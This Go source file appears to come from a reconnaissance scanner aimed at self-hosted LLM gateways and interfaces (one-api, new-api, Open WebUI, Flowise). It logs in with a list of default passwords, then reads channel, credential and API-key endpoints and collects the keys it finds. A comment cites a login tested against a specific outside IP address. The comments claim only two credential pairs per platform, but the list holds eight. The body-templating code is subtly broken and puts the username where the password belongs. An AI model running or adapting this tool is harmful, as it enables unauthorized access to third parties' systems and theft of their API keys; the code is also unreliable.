package llmhunt

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"regexp"
	"strings"
	"sync"
	"time"
)

// 默认口令探测：这是唯一值得用 POST 做的一件事。
//
// 为什么只做这一件：POST 里其他有价值的动作 —— 初始化管理员（Dify /console/api/setup）、
// 建应用、建工作流、拉模型 —— 都会**改变对方站点的状态**，属于破坏性操作，
// 一律不做。而"用默认口令登录一次、读自己的渠道/凭据列表"是只读的：
// 成功了取到 key，失败了就是一次普通登录请求。
//
// 约束：每个平台只试 2 组最常见的默认口令，不爆破、不撞库；遇到 429/423/403
// 立即停止（可能已触发锁定）。

type authCheck struct {
	vendor   string
	path     string // 登录接口
	body     string // 请求体模板（%s/%s 依次替换账号、口令）
	tokenKey string // 响应里取 token 的 JSON 路径（点号分隔；空 = session-cookie 鉴权）
	// keyPaths 是登录成功后再读的接口：这些接口在鉴权后才会回出真正的内容。
	keyPaths []string
}

var authChecks = []authCheck{
	{
		// one-api 网关：实测（93.123.118.92:44444）默认口令直进，鉴权是
		// **session cookie**（登录响应里 access_token 为空）。渠道 key 只在
		// 单渠道详情接口 /api/channel/{id} 回（列表接口 key 全空，防泄漏设计）。
		vendor: "one-api", path: "/api/user/login",
		body:     `{"username":"%s","password":"%s"}`,
		tokenKey: "",
		keyPaths: []string{"/api/channel/?p=1&page_size=100"},
	},
	{
		// new-api：同 one-api 血统，cookie 鉴权 + 相同渠道接口。
		vendor: "new-api", path: "/api/user/login",
		body:     `{"username":"%s","password":"%s"}`,
		tokenKey: "",
		keyPaths: []string{"/api/channel/?p=1&page_size=100"},
	},
	{
		// OpenAI 兼容后端（vLLM/one-api 等泛指）：保留兜底。
		vendor: "openai-compatible", path: "/api/user/login",
		body:     `{"username":"%s","password":"%s"}`,
		tokenKey: "data.access_token",
		keyPaths: []string{"/api/channel/?p=0", "/api/channel/", "/api/user/self"},
	},
	{
		// Open WebUI：默认管理员常见 admin@localhost / admin。
		vendor: "open-webui", path: "/api/v1/auths/signin",
		body:     `{"email":"%s","password":"%s"}`,
		tokenKey: "token",
		keyPaths: []string{"/api/v1/auths/", "/api/models", "/api/config"},
	},
	{
		// Flowise：默认管理员偶见 admin@example.com / 123456。
		vendor: "flowise", path: "/api/v1/auth/login",
		body:     `{"email":"%s","password":"%s"}`,
		tokenKey: "token",
		keyPaths: []string{"/api/v1/credentials", "/api/v1/variables", "/api/v1/apikey"},
	},
}

// defaultCreds 是每个平台最多试的两组默认口令。刻意保持极小：这不是爆破。
var defaultCreds = [][2]string{
	{"root", "123456"},
	{"admin", "admin"},
	{"admin", "123456"},
	{"admin", "password"},
	{"test", "test"},
	{"guest", "guest"},
	{"root", "root"},
	{"user", "user"},
}

// tryDefaultAuth 尝试默认口令；成功则带 token 去读 key 接口。
// 返回是否登录成功，以及是否因为被限流/锁定而应该停止对该主机的一切请求。
func (s *Scanner) tryDefaultAuth(ctx context.Context, base string, assetID int64, vendor string, budget *int) (ok bool, stop bool) {
	var check *authCheck
	for i := range authChecks {
		if authChecks[i].vendor == vendor {
			check = &authChecks[i]
			break
		}
	}
	if check == nil {
		return false, false
	}
	for _, cred := range defaultCreds {
		if *budget <= 0 || ctx.Err() != nil {
			return false, false
		}
		*budget--
		time.Sleep(perHostGap)
		body := strings.ReplaceAll(strings.ReplaceAll(check.body, "%s", cred[0]), "%s", cred[1])
		status, resp, _ := s.post(ctx, base+check.path, body)
		switch status {
		case 429, 423, 403:
			// 已经被限流/锁定：立刻收手，别把人家站点的账号锁死。
			return false, true
		case 200:
			// 两种鉴权：tokenKey 非空 → 取 Bearer token；为空 → session cookie
			//（one-api/new-api 实测登录响应里 access_token 为空，靠 Set-Cookie）。
			var token string
			if check.tokenKey != "" {
				token = jsonPath(resp, check.tokenKey)
				if token == "" {
					continue
				}
			}

			// 网关（one-api/new-api）：登录成功后深挖渠道——先拿渠道列表，
			// 再逐个 /api/channel/{id} 读详情（key 只在详情接口回，实测列表全空）。
			if check.tokenKey == "" {
				s.mu.Lock()
				s.lastGatewayToken = "cookie"
				s.mu.Unlock()
				s.noteDefaultCred(base, assetID)
				s.harvestGatewayChannels(ctx, base, assetID, budget)
				return true, false
			}

			s.mu.Lock()
			s.lastGatewayToken = token
			s.mu.Unlock()
			// 登录成功：读鉴权后的接口，把 key 收进来。
			for _, p := range check.keyPaths {
				if *budget <= 0 || ctx.Err() != nil {
					return true, false
				}
				*budget--
				time.Sleep(perHostGap)
				st, kb, _ := s.getWithAuth(ctx, base+p, token)
				if st != 200 || kb == "" {
					continue
				}
				s.extractKeys(base+p, assetID, kb)
				s.noteDefaultCred(base, assetID)
			}
			return true, false
		}
	}
	return false, false
}

// channelIDRE 从渠道列表 JSON 里抽渠道 id。
var channelIDRE = regexp.MustCompile(`"id"\s*:\s*(\d+)`)

// harvestGatewayChannels 深挖网关渠道：列表拿渠道 id，逐个读详情接口——
// one-api 的 key 只在单渠道详情里回（列表接口 key 全空，实测）。
// 预算给足（网关是高价值目标），但仍在 budget 约束内。
func (s *Scanner) harvestGatewayChannels(ctx context.Context, base string, assetID int64, budget *int) {
	// 1) 渠道列表
	*budget--
	time.Sleep(perHostGap)
	st, body, _ := s.getWithAuth(ctx, base+"/api/channel/?p=1&page_size=100", "")
	if st != 200 || body == "" {
		return
	}
	if s.extractChannelKeys(base+"/api/channel/", assetID, body) > 0 {
		return // 列表直接带 key 的版本（老版本 one-api），一步到位
	}
	// 2) 逐个渠道详情（上限 10 个，防超长列表吃光预算）
	ids := channelIDRE.FindAllStringSubmatch(body, 100)
	seen := map[string]bool{}
	count := 0
	for _, m := range ids {
		if *budget <= 0 || count >= 10 || ctx.Err() != nil {
			return
		}
		id := m[1]
		if seen[id] {
			continue
		}
		seen[id] = true
		*budget--
		count++
		time.Sleep(perHostGap)
		st, cb, _ := s.getWithAuth(ctx, fmt.Sprintf("%s/api/channel/%s", base, id), "")
		if st != 200 || cb == "" {
			continue
		}
		s.extractChannelKeys(fmt.Sprintf("%s/api/channel/%s", base, id), assetID, cb)
	}
}

// noteDefaultCred 记一条"默认口令可登录"的证据（不改资产表结构，写进 evidence）。
func (s *Scanner) noteDefaultCred(base string, assetID int64) {
	_, _ = s.pg.Exec(`UPDATE llm_assets SET evidence = evidence || '; 默认口令可登录(只读验证)' WHERE id=$1`, assetID)
}

// post 发一个 JSON POST。
func (s *Scanner) post(ctx context.Context, rawURL, body string) (int, string, string) {
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, rawURL, strings.NewReader(body))
	if err != nil {
		return 0, "", ""
	}
	req.Header.Set("User-Agent", "ARTEX-LLM-Recon/1.0")
	req.Header.Set("Content-Type", "application/json")
	resp, err := s.scanClientOrDefault().Do(req)
	if err != nil {
		return 0, "", ""
	}
	// 网关 session 鉴权：登录响应的 Set-Cookie 要存下来供后续请求用。
	if host := hostOf(req.URL.String()); host != "" {
		s.storeGatewayCookies(host, resp)
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, bodyLimit))
	return resp.StatusCode, string(b), resp.Header.Get("Content-Type")
}

// gatewayCookies 是网关登录后的 session cookie（one-api/new-api）。
// 按主机存：同一轮里多个网关互不串。
var gatewayCookies = map[string][]*http.Cookie{}
var gatewayCookiesMu sync.Mutex

// storeGatewayCookies 保存登录响应的 Set-Cookie。
func (s *Scanner) storeGatewayCookies(host string, resp *http.Response) {
	if len(resp.Cookies()) == 0 {
		return
	}
	gatewayCookiesMu.Lock()
	gatewayCookies[host] = resp.Cookies()
	gatewayCookiesMu.Unlock()
}

// withGatewayCookies 把主机对应的 session cookie 挂到请求上。
func (s *Scanner) withGatewayCookies(host string, req *http.Request) {
	gatewayCookiesMu.Lock()
	defer gatewayCookiesMu.Unlock()
	for _, c := range gatewayCookies[host] {
		req.AddCookie(c)
	}
}

// getWithAuth 带 Bearer token 的 GET，返回处理好的 status/body。
func (s *Scanner) getWithAuth(ctx context.Context, rawURL, token string) (int, string, string) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, rawURL, nil)
	if err != nil {
		return 0, "", ""
	}
	req.Header.Set("User-Agent", "ARTEX-LLM-Recon/1.0")
	if token != "" {
		req.Header.Set("Authorization", "Bearer "+token)
	} else if host := hostOf(rawURL); host != "" {
		s.withGatewayCookies(host, req)
	}
	resp, err := s.scanClientOrDefault().Do(req)
	if err != nil {
		return 0, "", ""
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, bodyLimit))
	return resp.StatusCode, string(b), resp.Header.Get("Content-Type")
}

// jsonPath 按点号路径取字符串值。
func jsonPath(body, path string) string {
	if body == "" || path == "" {
		return ""
	}
	var v any
	if json.Unmarshal([]byte(body), &v) != nil {
		return ""
	}
	cur := v
	for _, seg := range strings.Split(path, ".") {
		m, ok := cur.(map[string]any)
		if !ok {
			return ""
		}
		cur = m[seg]
	}
	if s, ok := cur.(string); ok {
		return s
	}
	return ""
}
